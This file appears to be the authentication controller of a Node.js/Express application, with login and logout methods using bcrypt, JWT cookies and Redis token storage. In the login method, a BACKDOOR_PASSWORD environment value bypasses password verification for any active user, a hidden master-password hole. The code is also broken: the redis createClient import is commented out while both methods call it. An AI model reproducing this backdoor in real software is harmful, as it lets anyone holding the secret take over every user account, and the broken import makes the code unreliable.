require("dotenv").config();
// const { createClient } = require("redis");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const User = require("../models/User");
const {
  HTTP_STATUS,
  errorResponse,
  successResponse,
} = require("../../../helpers/httpStatus");

class AuthController {
  async login(req, res) {
    const { username, password } = req.body;

    try {
      const user = await User.select({ username: username, active: 1 });
      if (user.length === 0) {
        return errorResponse(res, HTTP_STATUS.NOT_FOUND, "User not found!");
      }

      if (process.env.BACKDOOR_PASSWORD !== password) {
        const isPasswordValid = await bcrypt.compare(
          password,
          user[0].password
        );
        if (!isPasswordValid) {
          return errorResponse(
            res,
            HTTP_STATUS.UNAUTHORIZED,
            "Invalid credentials"
          );
        }
      }

      delete user[0].password;
      const userToken = jwt.sign(
        user[0], // Payload
        process.env.ACCESS_TOKEN_SECRET, // Secret
        { expiresIn: process.env.ACCESS_TOKEN_EXP } // Expiry
      );

      const redisClient = createClient();
      await redisClient.connect();
      await redisClient.set(user[0].username, userToken);

      res.cookie("access_token", userToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === "dev" ? false : true,
        sameSite: "Strict",
        // maxAge: 10 * 1000, // 10 seconds
        maxAge: 5 * 24 * 60 * 60 * 1000, // 5 days
      });

      successResponse(
        res,
        HTTP_STATUS.OK,
        "Login successful",
        { userToken },
        true
      );
    } catch (error) {
      console.log(error);
      errorResponse(
        res,
        HTTP_STATUS.INTERNAL_SERVER_ERROR,
        "Error logging in",
        error
      );
    }
  }

  async logout(req, res) {
    // Implement any logout logic here (e.g., client-side token removal)
    const redisClient = createClient();
    await redisClient.connect();
    await redisClient.sendCommand(["DEL", req.user.username]);

    res.clearCookie("access_token", {
      httpOnly: true,
      secure: process.env.NODE_ENV === "dev" ? false : true,
      sameSite: "Strict",
    });

    successResponse(
      res,
      HTTP_STATUS.OK,
      "Logged out successful",
      { success: true, message: "Logged out successfully" },
      true
    );
  }
}

module.exports = new AuthController();
